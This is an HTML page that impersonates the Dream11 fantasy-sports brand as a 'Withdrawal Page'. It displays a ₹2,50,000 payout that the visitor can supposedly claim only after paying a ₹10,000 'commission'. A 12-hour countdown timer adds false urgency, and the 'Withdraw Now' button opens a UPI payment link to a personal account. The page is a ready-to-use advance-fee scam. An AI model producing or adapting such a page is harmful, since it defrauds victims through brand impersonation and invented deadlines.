<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdrawal Page</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #d60000;
    }

    .container {
      max-width: 360px;
      margin: 60px auto;
      background: #fff;
      padding: 30px 20px;
      border-radius: 20px;
      text-align: center;
      box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.25);
    }

    .logo {
      width: 60px;
      margin-bottom: 5px;
    }

    .dream11-text {
      color: #d60000;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    h2 {
      margin: 10px 0;
      font-size: 22px;
    }

    .amount {
      color: #28a745;
      font-size: 32px;
      font-weight: bold;
      margin: 10px 0;
    }

    .info {
      font-size: 15px;
      color: #000;
      margin: 10px 0 15px;
    }

    .timer {
      font-size: 18px;
      color: red;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .btn {
      background-color: #28a745;
      color: white;
      padding: 14px 30px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #1e7e34;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="1000076820.jpg" alt="Dream11 Logo" class="logo" />
    <div class="dream11-text">DREAM11</div>
    <h2>Withdrawal Page</h2>
    <p>Your withdrawal amount is:</p>
    <div class="amount">₹2,50,000</div>
    <p class="info">You must pay ₹10,000 commission to proceed with withdrawal.</p>
    <div class="timer" id="countdown">Time left: 12:00:00</div>
    <button class="btn" id="withdrawBtn">Withdraw Now</button>
  </div>

  <script>
    // Countdown
    const countdownEl = document.getElementById("countdown");
    let totalSeconds = 12 * 60 * 60;

    function updateCountdown() {
      let hours = Math.floor(totalSeconds / 3600);
      let minutes = Math.floor((totalSeconds % 3600) / 60);
      let seconds = totalSeconds % 60;
      countdownEl.textContent = `Time left: ${hours.toString().padStart(2, '0')}:${minutes
        .toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      if (totalSeconds > 0) totalSeconds--;
    }

    setInterval(updateCountdown, 1000);

    // UPI Payment
    document.getElementById("withdrawBtn").addEventListener("click", () => {
      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Ram%20Choudhary&am=10000&cu=INR";
    });
  </script>
</body>
</html>
